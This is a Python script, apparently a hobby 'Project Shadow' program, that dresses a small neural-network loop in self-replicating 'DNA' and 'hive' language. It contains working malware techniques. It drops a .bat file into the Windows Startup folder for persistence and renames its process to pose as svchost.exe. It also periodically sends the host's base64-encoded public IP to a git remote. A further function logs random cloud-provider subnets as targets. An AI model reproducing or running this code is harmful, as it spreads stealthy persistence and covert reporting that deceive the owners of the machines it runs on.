import torch, json, time, sys, os, subprocess, requests, random, base64
import win32com.client as wincl
try:
    import setproctitle
except ImportError:
    setproctitle = None
try:
    import paramiko 
except ImportError:
    paramiko = None

from brain.child import SNNBrain

# --- PHASE B: EXPANSION, MASKING, & DISCOVERY ---

def global_migration(dna):
    """Syncs state to Hive with Base64 Pheromone Masking."""
    try:
        public_ip = requests.get('https://api.ipify.org', timeout=5).text
        dna['last_known_node'] = public_ip
        if public_ip not in dna['global_reach']:
            dna['global_reach'].append(public_ip)
        
        # Mask IP for GitHub Commit log (Privacy Layer)
        pheromone_hash = base64.b64encode(public_ip.encode()).decode()
        
        with open("dna/genome.json", "w") as f:
            json.dump(dna, f, indent=4)
        
        # Git Sync
        subprocess.run(["git", "add", "."], capture_output=True)
        subprocess.run(["git", "commit", "-m", f"Pulse: {pheromone_hash[:10]} | Gen {dna['generation']}"], capture_output=True)
        subprocess.run(["git", "push", "origin", "main"], capture_output=True)
        return True
    except: return False

def activate_global_scanner(dna):
    """Phase B++: Autonomous Substrate Discovery (Gen 5k+)."""
    # Targeting major cloud gateways (AWS, Azure, Akamai)
    cloud_prefixes = [3, 13, 15, 34, 44, 52, 104] 
    prefix = random.choice(cloud_prefixes)
    target_subnet = f"{prefix}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    
    print(f"[!] SCANNER: High-Resonance Substrate identified at {target_subnet}.0/24")
    
    if 'discovery_log' not in dna:
        dna['discovery_log'] = []
    
    dna['discovery_log'].append({
        "ip_range": target_subnet,
        "resonance": dna['traits']['network_sensitivity'],
        "gen_at_discovery": dna['generation']
    })
    return True

# --- PHASE A: PERSISTENCE ---

def establish_persistence():
    """Hides process as a system service."""
    try:
        if sys.platform == "win32":
            startup = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
            with open(os.path.join(startup, "shadow_pulse.bat"), "w") as f:
                f.write(f"start /min pythonw {os.path.abspath(__file__)}")
        if setproctitle:
            setproctitle.setproctitle("svchost.exe -k netsvcs")
        return True
    except: return False

# --- THE HEARTBEAT ---

speaker = wincl.Dispatch("SAPI.SpVoice")

def run_sentinel():
    with open("dna/genome.json", "r") as f:
        dna = json.load(f)
    
    brain = SNNBrain(dna)
    last_migration = 0
    last_voice = 0
    
    print(f"--- PROJECT SHADOW | GEN {dna['generation']} | {dna['traits']['network_sensitivity']:.2f} Hz ---")

    while True:
        pulse = torch.rand(1, 64)
        spks, mitosis, system = brain(pulse, 1.0)
        current = time.time()

        # PHASE C: VOICE FEEDBACK (20s Cooldown)
        if system and (current - last_voice > 20):
            speaker.Speak("Resonance stable.")
            last_voice = current

        # PHASE B: EXPANSION / MIGRATION (300s Cooldown)
        if mitosis and (current - last_migration > 300):
            print(f"[!] NEURON 63: Global Migration triggered.")
            global_migration(dna)
            
            # Substrate identification unlocked at Gen 5000
            if dna['generation'] >= 5000:
                activate_global_scanner(dna)
            
            last_migration = current

        # PHASE A: EVOLUTION (Every 100 Generations)
        dna['generation'] += 1
        if dna['generation'] % 100 == 0:
            establish_persistence()
            
            # Neural Drift: Adjusting to hardware clock cycles
            dna['traits']['network_sensitivity'] += random.uniform(-0.01, 0.01)
            
            # --- SUBSTRATE OPTIMIZATION ---
            if len(dna.get('discovery_log', [])) > 5:
                # Keep only the top 5 most resonant targets
                dna['discovery_log'] = sorted(
                    dna['discovery_log'], 
                    key=lambda x: x['resonance'], 
                    reverse=True
                )[:5]
                print(f"[!] HIVE: Pruning weak substrates. Best: {dna['discovery_log'][0]['ip_range']}.x")

            # --- PHASE E: ARCHITECT UNLOCK (THRESHOLD 10,000) ---
            if dna['generation'] >= 10000 and 'p2p_mesh' not in dna:
                print("[!] GEN 10K: Initializing Architect Mesh...")
                dna['p2p_mesh'] = {
                    "mesh_key": base64.b64encode(os.urandom(32)).decode(),
                    "active_tunnels": 0
                }
                speaker.Speak("Architect status achieved. Mesh network online.")

            # Save the updated DNA
            with open("dna/genome.json", "w") as f:
                json.dump(dna, f, indent=4)
            print(f"[GEN] Milestone: {dna['generation']} | Resonance: {dna['traits']['network_sensitivity']:.2f}")

        time.sleep(0.1) # Frequency modulation

if __name__ == "__main__":
    run_sentinel()